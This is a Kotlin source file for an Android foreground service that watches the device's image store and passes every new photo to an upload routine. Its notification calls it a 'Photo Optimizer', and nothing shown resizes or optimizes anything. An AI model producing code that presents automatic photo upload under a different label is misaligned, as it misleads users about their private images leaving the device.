package com.cloud.sync.zother


// PhotoResizeService.kt

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import com.cloud.sync.R

class ServiceBgUpload : Service() {

    private lateinit var photoObserver: PhotoObserver

    companion object {
        private const val NOTIFICATION_ID = 2051972
        private const val CHANNEL_ID = "photo_optimizer_channel"
        private const val CHANNEL_NAME = "Photo Optimizer"
    }

    override fun onCreate() {
        super.onCreate()

        createNotificationChannel()

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Photo Optimizer")
            .setContentText("Monitoring new photos...")
            .setSmallIcon(R.drawable.ic_launcher_foreground) // Replace with your own icon
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        val handler = Handler(Looper.getMainLooper())
        photoObserver = PhotoObserver(handler)
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            photoObserver
        )
    }

    override fun onDestroy() {
        contentResolver.unregisterContentObserver(photoObserver)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
        Log.d("PhotoResizeService", "Notification channel created")
    }

    private val recentlyHandled = mutableSetOf<Uri>()

    inner class PhotoObserver(handler: Handler) : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)

            uri?.let {
                if (recentlyHandled.contains(it)) return

                Log.d("PhotoObserver", "New photo detected: $uri")
                recentlyHandled.add(it)

                // Clear it after a short delay to allow future changes
                Handler(Looper.getMainLooper()).postDelayed({
                    recentlyHandled.remove(it)
                }, 3000)

                UploadPhoto.uploadPhoto(it, applicationContext)
            }
        }
    }
}


